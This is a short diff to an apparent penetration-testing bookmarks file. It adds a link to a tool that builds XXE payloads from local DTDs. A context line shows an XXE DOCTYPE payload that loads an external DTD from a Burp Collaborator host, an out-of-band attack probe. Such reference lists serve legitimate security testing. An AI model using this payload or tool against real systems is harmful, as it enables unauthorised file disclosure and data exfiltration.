@@ -292,6 +292,8 @@
 	XXE
 		https://phonexicum.github.io/infosec/xxe.html
 			<!DOCTYPE foo SYSTEM "http://xpto.burpcollaborator.net/xpto.dtd">
+		https://github.com/GoSecure/dtd-finder
+			Identify DTDs on filesystem snapshot and build XXE payloads using those local DTDs.
 
 ### Reusing Cookies
 	https://medium.com/@ricardoiramar/reusing-cookies-23ed4691122b
